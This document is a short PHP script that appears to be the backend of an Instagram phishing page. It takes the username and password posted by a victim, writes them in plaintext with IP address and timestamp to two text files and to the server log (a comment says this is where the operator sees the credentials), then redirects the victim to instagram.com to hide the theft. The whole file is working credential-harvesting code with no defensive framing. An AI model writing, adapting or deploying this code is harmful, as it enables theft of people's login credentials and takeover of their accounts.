<?php
// Get credentials from the form
$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$timestamp = date('Y-m-d H:i:s');

// Create the log message
$log = "=== NEW LOGIN ATTEMPT ===\n";
$log .= "Username: $username\n";
$log .= "Password: $password\n";
$log .= "IP: $ip\n";
$log .= "Time: $timestamp\n";
$log .= "========================\n\n";

// Save to file
if (!is_dir('auth')) {
    mkdir('auth', 0777, true);
}
file_put_contents('auth/credentials.txt', $log, FILE_APPEND);
file_put_contents('usernames.txt', "Username: $username | Pass: $password | IP: $ip | Time: $timestamp\n", FILE_APPEND);

// Log to Render – this is where you see credentials!
error_log($log);

// ========================================
// REDIRECT TO INSTAGRAM.COM
// ========================================
header('Location: https://instagram.com');
exit();
?>
